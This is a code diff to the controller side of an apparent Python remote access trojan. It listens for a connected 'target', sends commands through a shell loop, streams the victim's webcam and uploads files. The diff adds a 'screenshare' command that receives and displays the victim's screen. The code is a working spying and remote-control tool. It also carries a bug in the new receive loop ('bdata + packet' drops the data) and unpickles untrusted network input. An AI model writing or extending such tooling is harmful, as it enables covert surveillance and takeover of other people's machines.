@@ -7,7 +7,7 @@ import cv2
 import threading
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.0.107', 9999)) # Enter your ip address in '#'
+sock.bind(('#', 9999)) # Enter your ip address in '#'
 print('Waiting for connection ...')
 sock.listen(1)
 
@@ -46,7 +46,7 @@ def file_upload(filename):
 
 def convert_byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.bind(('192.168.0.107', 9998)) # Enter your ip address in '#'
+    sock.bind(('#', 4444)) # Enter your ip address in '#'
     sock.listen(5)
     connect = sock.accept()
     target = connect[0]
@@ -79,6 +79,41 @@ def convert_byte_stream():
 def stream_cam():
     t = threading.Thread(target=convert_byte_stream)
     t.start()
+
+def convert_byte_screen_recorder():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('#', 8888)) # Enter your ip address in '#'
+    sock.listen(5)
+    connect = sock.accept()
+    target = connect[0]
+    ip = connect[1]
+
+    bdata = b""
+    payload_size = struct.calcsize("i")
+
+    while True:
+        while (len(bdata)) < payload_size:
+            packet = target.recv(1024)
+            if not packet: break
+            bdata + packet   
+        packed_msg_size = bdata[:payload_size]
+        bdata = bdata[payload_size:]
+        msg_size = struct.unpack("i", packed_msg_size)[0]
+        while len(bdata) < msg_size:
+            bdata += target.recv(1024)
+        frame_data = bdata[:msg_size]
+        bdata = bdata[msg_size:]
+        frame = pickle.loads(frame_data)
+        cv2.imshow("Are recording the screen ...", frame)
+        key = cv2.waitKey(1)
+        if key == 27:
+            break
+    target.close()
+    cv2.destroyAllWindows()   
+
+def record_screen():
+    t = threading.Thread(target=convert_byte_screen_recorder)
+    t.start()  
 
 def shell():
     n = 0
@@ -117,7 +152,9 @@ def shell():
                 except socket.timeout as e:
                     break
             _target.settimeout(None)
-            file.close
+            file.close()
+        elif command == 'screenshare':
+            record_screen()
         else:
           result = data_received()
           print(result)
